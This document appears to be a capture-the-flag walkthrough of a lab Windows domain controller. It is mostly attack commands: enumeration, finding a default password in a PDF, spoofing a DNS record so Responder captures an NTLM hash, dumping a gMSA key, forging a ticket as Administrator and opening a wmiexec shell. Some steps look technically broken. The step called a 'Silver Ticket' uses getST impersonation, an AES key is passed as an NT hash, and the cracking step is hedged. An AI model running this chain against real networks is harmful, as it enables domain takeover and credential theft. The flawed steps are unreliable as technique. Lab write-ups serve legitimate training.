---
description: >-
  Leveraged gMSA misconfiguration of a user to forge a Silver Ticket to become a
  Domain Admin.
---

# Intelligence

## Summary

* 15 ports open including SMB, LDAP, Kerberos, RPC — confirmed Active Directory Domain Controller.
* Extracted usernames from PDF metadata.
* Used a date-based filename wordlist to download documents and uncover default password.
* Validated credentials with `crackmapexec` and found access to SMB shares.
* Discovered a PowerShell script scheduled to ping `web*` DNS entries — enabled ADIDNS attack.
* Created a fake DNS record pointing to attacker machine and captured NTLM hash with Responder.
* Cracked the NTLMv2 hash to get credentials for a high-privileged user.
* BloodHound revealed Ted.Graves had `ReadGMSAPassword` on `svc_int` account.
* Dumped gMSA password and created a Silver Ticket impersonating Administrator.
* Used Silver Ticket with `wmiexec.py` to get Administrator shell.



## 🧵 Let's Unpack

***

### 🔍Enumeration

#### Nmap Full Port Scan

```bash
sudo nmap -sC -sV -A -T5 -p- 10.10.10.248
```

The host is a Windows Domain Controller. Services of interest:

```
88/tcp    open  kerberos-sec
389/tcp   open  ldap
445/tcp   open  microsoft-ds
5985/tcp  open  http Microsoft HTTPAPI
9389/tcp  open  mc-nmf
```

#### enum4linux

```bash
enum4linux -a 10.10.10.248
```

We confirmed guest access but got limited information.

***

#### :file\_folder: File-Based Enumeration

We brute-forced document paths with a custom date wordlist script:

```bash
# Generate filenames like 2020-06-01-upload.pdf
python dateGen.py 2020 2021 0 "-"
```

```bash
# Prepare gobuster results
cat gobuster80 | awk '{split($0,a," "); print a[1]}' | awk '{print "http://10.10.10.248/documents"$0}' > docs.txt
wget -i docs.txt
```

Found **default creds** inside one PDF:

```
Username: Tiffany.Molina
Password: NewIntelligenceCorpUser9876
```

***

### 🔐 SMB Access

```bash
sudo crackmapexec smb 10.10.10.248 -u Tiffany.Molina -p NewIntelligenceCorpUser9876 -d intelligence.htb
```

Confirmed valid credentials.

```bash
smbmap -u "Tiffany.Molina" -p "NewIntelligenceCorpUser9876" -H 10.10.10.248
smbclient -U Tiffany.Molina //10.10.10.248/IT
```

Found a file named `downdetector.ps1` — a scheduled script that monitors web DNS records and emails status updates to **Ted.Graves@intelligence.htb** using authenticated web requests.

***

### 🧨 Exploiting ADIDNS via Responder

Authenticated users can modify DNS via `dnstool.py`:

```bash
./dnstool.py -u 'Tiffany.Molina' -p 'NewIntelligenceCorpUser9876' 10.10.10.248 -a add -r webl -d 10.10.14.13 -t A
```

Run Responder to intercept NTLM hash:

```bash
responder -I tun0
```

Captured:

```
Username: Ted.Graves
NTLMv2 Hash: <hash>
```

***

### 🔑 Credential Cracking & BloodHound

Successfully cracked hash (or obtained cleartext creds):

```
Username: Ted.Graves
Password: Mr.Teddy
```

Used `bloodhound-python` for enumeration:

```bash
bloodhound-python -d intelligence.htb -u Ted.Graves -p Mr.Teddy -ns 10.10.10.248 -c All
```

BloodHound revealed:\
🧪 `Ted.Graves` ∈ `ITSupport` → has `ReadGMSAPassword` on `svc_int`

***

### 📦 Dump gMSA Password and Generate Silver Ticket

```bash
# Dumping gMSA password
./gMSADumper.py -u 'Ted.Graves' -p 'Mr.Teddy' -d intelligence.htb -l 10.10.10.248
```

Output:

```
svc_int$:aes256-cts-hmac-sha1-96:285962204a4f54a092182cc51512bda5137de5b33becfd27797d079ba440e6d5
svc_int$:aes128-cts-hmac-sha1-96:cc50179e1ce82827a22ef0ad4fab3bd9
```

```bash
# Generate Silver Ticket as Administrator
Impacket-getST -spn WWW/dc.intelligence.htb -impersonate Administrator intelligence.htb/svc_int -hashes :285962204a4f54a092182cc51512bda5137de5b33becfd27797d079ba440e6d5
```

***

### 🖥️ Administrator Shell via Silver Ticket

```bash
export KRB5CCNAME=Administrator.ccache
echo "10.10.10.248 dc.intelligence.htb" | sudo tee -a /etc/hosts

# Shell!
wmiexec.py -k -no-pass dc.intelligence.htb
```

***





***
